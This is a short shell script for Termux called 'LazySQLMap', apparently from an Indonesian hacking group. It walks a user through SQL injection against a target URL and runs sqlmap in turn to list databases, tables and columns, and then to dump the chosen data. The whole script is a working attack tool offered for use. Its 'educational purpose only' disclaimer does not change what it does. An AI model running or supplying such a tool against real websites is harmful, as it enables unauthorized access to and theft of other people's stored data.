#!/data/data/com.termux/files/usr/bin/lazysqlmap
# LazySQLMap
#
# This Tool Designed For Lazy Way To Pentest :)
# Remember Educational Purpose only Not For Crime
# Im Not Responsible If Something Bad Thing Happen
# Use At Your Own Risk
#
# Coded by : Yukinoshita 47 | Garuda Security Hacker
# More Info : http://www.garudasecurityhacker.org
#
#

# START

# Header 

echo ""
echo ""
echo ""
echo "  _    _  _            ____   ___  _ " |lolcat
echo " | |  | || | _____   _/ ___| / _ \| |" |lolcat
echo " | |  | || ||_  / | | \___ \| | | | |" |lolcat
echo " | |__|__   _/ /| |_| |___) | |_| | |___" |lolcat
echo " |_____| |_|/___|\__, |____/ \__\_\_____|" |lolcat
echo "                  |___/     " |lolcat
echo "				\033[92m<./comeng>\033[0m"
echo ""
echo ""
echo "\033[31m    Kita Buat Injeksi Lebih Mudah :)"
echo "" 
echo "    ==[ Tools Name : LazySQLMap"
echo "    ==[ ReCoded by : Mr.¿?"
echo "    ==[ Team       : X-Core"
echo "    ==[ Version    : 1.0.0"
echo "    ==[ Whats App  : 082333507125\033[0m"
echo ""

# Select Target

echo "" 
echo " Enter your SQL Injection Vulnerable Target Below" 
echo " Example : http://site.com/index.php?id=1"
echo " If You Want To Stop Just Press CTRL + C "
echo "" 
echo " Termux-LazySQLMap >>"
read TARGET
python2 sqlmap.py -u $TARGET --dbs

# Select Database

echo " Select Database For Table Injection" 
echo "" 
echo " GSH_LazySQLMap >>"
read DATABASE
python2 sqlmap.py -u $TARGET -D $DATABASE --table

# Select Table

echo " Select Table For Column Injection" 
echo "" 
echo " Termux-LazySQLMap >>"
read TABLE
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE --column

# Select Columns

echo " Select Column For Database Dump" 
echo "" 
echo " Termux-LazySQLMap >>"
read COLUMN
python2 sqlmap.py -u $TARGET -D $DATABASE -T $TABLE -C $COLUMN --dump

# END

